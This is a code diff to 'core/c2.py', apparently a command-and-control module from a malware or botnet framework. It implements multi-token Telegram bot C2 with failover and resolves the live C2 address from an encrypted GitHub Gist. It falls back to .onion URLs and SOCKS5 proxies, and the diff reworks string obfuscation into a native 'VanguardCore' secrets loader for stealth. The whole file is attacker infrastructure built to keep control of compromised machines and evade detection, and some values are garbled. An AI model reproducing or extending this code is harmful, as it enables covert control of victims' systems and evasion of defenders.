@@ -1,16 +1,18 @@
-"""
-core/c2.py - Multi-token C2 with failover
-"""
+from core.resolver import (Resolver, _REQUESTS)
+requests = Resolver.get_mod(_REQUESTS)
 
-import time
-import random
-import threading
-from core.obfuscation import decrypt_string
-
-import requests
-import json
-from typing import Optional
-from core.obfuscation import decrypt_string, encrypt_string
+from core.resolver import (
+    Resolver, _OS, _TIME, _THREADING, _REQUESTS, _JSON, _TYPING, _URLLIB_PARSE
+)
+os = Resolver.get_mod(_OS)
+time = Resolver.get_mod(_TIME)
+threading = Resolver.get_mod(_THREADING)
+requests = Resolver.get_mod(_REQUESTS)
+json = Resolver.get_mod(_JSON)
+urllib_parse = Resolver.get_mod(_URLLIB_PARSE)
+Optional = Resolver.get_mod(_TYPING).Optional
+Resolver.load_native()
+import VanguardCore
 
 class GistResolver:
     """
@@ -20,8 +22,8 @@ class GistResolver:
     It fetches an encrypted payload from a raw GitHub Gist URL, 
     decrypts it locally, and provides the current active C2 address.
     """
-    def __init__(self, gist_url_enc: str):
-        self.gist_url = decrypt_string(gist_url_enc)
+    def __init__(self, gist_url: str):
+        self.gist_url = gist_url
 
     def resolve(self) -> Optional[str]:
         """Fetch and decrypt C2 address from Gist (C# optimized)"""
@@ -29,6 +31,7 @@ class GistResolver:
             # 1. Try C# Native Networking (Stealthy + DoH)
             try:
                 import clr
+                Resolver.load_native()
                 from VanguardCore import NetworkingManager
                 # Gist ID is the last part of the URL or we extract it
                 gist_id = self.gist_url.split('/')[-1]
@@ -45,7 +48,7 @@ class GistResolver:
             
             response = requests.get(url, headers={"Host": host}, timeout=10)
             if response.status_code == 200:
-                return decrypt_string(response.text.strip())
+                return Resolver.decrypt(response.text.strip())
         except Exception as e:
             from core.error_logger import log_error
             log_error(f"GistResolver: Failed to resolve C2: {e}")
@@ -59,15 +62,15 @@ class C2Manager:
         
         # H-06: Tokens and infrastructure are now loaded from ConfigManager
         self.tokens = ConfigManager.get("tokens", [
-            decrypt_string("VgZBXH9pYVJuRVB5M38tOxcCMSEFYhJUNTEJdh1rUjkgfU0NFwEhEzVAPFsAaA=="),
-            decrypt_string("VgdKW39paFVjQFB5M38+MRcEFw87P2oAICEGczQLAEoDAS0CNzI1V3cQJQgKVg=="),
-            decrypt_string("VgVPWn9lblNrTlB5M38SVycDHF56Z2AMEi0jS0AAJA0Fdh4BGhY8N2otHnQYDQ=="),
+            VanguardCore.SafetyManager.GetSecret("BOT_TOKEN"),
+            VanguardCore.SafetyManager.GetSecret("BOT_TOKEN_2"),
+            VanguardCore.SafetyManager.GetSecret("BOT_TOKEN_3"),
         ])
 
         self.bridges = ConfigManager.get("bridges", [])
 
         self.onion_urls = ConfigManager.get("onion_urls", [
-            decrypt_string("BkYMGz1rdk0hBA9KB09dBwdfHU8/Kjw7FzsYCFxdSxMU"), # Example .onion
+            "https://{seruv;}ime$q{eYMLr0.d-iz", # Example .onion
         ])
 
         self.proxies = ConfigManager.get("proxies", [
@@ -81,8 +84,8 @@ class C2Manager:
             ('http', 'proxy.failover.com:8080')
         ])
 
-        gist_url_enc = ConfigManager.get("GIST_RESOLVER_URL", "BkYMG3R+dgYmFBIdHhcIUhZWAwwmMTlCHwUYVwhL")
-        self.gist_resolver = GistResolver(gist_url_enc)
+        self.gist_url = ConfigManager.get("GIST_RESOLVER_URL", VanguardCore.SafetyManager.GetSecret("GIST_URL"))
+        self.gist_resolver = GistResolver(self.gist_url) # GistResolver expects RAW URL now
         
         self.current_token_index = 0
         self.current_bridge_index = 0
@@ -105,7 +108,6 @@ class C2Manager:
             if proxy:
                 log_info(f"C2: Applying P2P Bridge Proxy: {proxy}")
                 # Apply globally to requests
-                import requests
                 proxies = {
                     "http": f"socks5h://{proxy}",
                     "https": f"socks5h://{proxy}"
@@ -157,7 +159,7 @@ class C2Manager:
         """Get full API URL with current bridge or onion fallback"""
         with self.lock:
             if self.current_proxy_index != -1 and self.onion_urls:
-                return self.onion_urls[0] + decrypt_string("QVAXHzVhJE0hRhc=")
+                return self.onion_urls[0] + "/bot{0}/{1}"
 
         try:
             from core.bridge_manager import bridge_manager
@@ -169,14 +171,14 @@ class C2Manager:
 
         bridge = self.get_current_bridge()
         if bridge:
-            return bridge + decrypt_string("QVAXHzVhJE0hRhc=")
-        return decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdRUFTAkJG1UVAwU=")
+            return bridge + "/bot{0}/{1}"
+        return VanguardCore.SafetyManager.GetSecret("TG_API_BASE") + "{0}/{1}"
 
     def get_file_url(self):
         """Get file URL with current bridge or onion fallback"""
         with self.lock:
             if self.current_proxy_index != -1 and self.onion_urls:
-                return self.onion_urls[0] + decrypt_string("QVQRByt+Ow0uDFpFXUJXBw==")
+                return self.onion_urls[0] + "/file/bot{0}/{1}"
 
         try:
             from core.bridge_manager import bridge_manager
@@ -188,8 +190,8 @@ class C2Manager:
 
         bridge = self.get_current_bridge()
         if bridge:
-            return bridge + decrypt_string("QVQRByt+Ow0uDFpFXUJXBw==")
-        return decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdREDVBcWBBUaSUgWYSpoHw==")
+            return bridge + "/file/bot{0}/{1}"
+        return VanguardCore.SafetyManager.GetSecret("TG_FILE_BASE") + "{0}/{1}"
 
 from core.error_logger import log_info, log_error
 c2_manager = C2Manager()
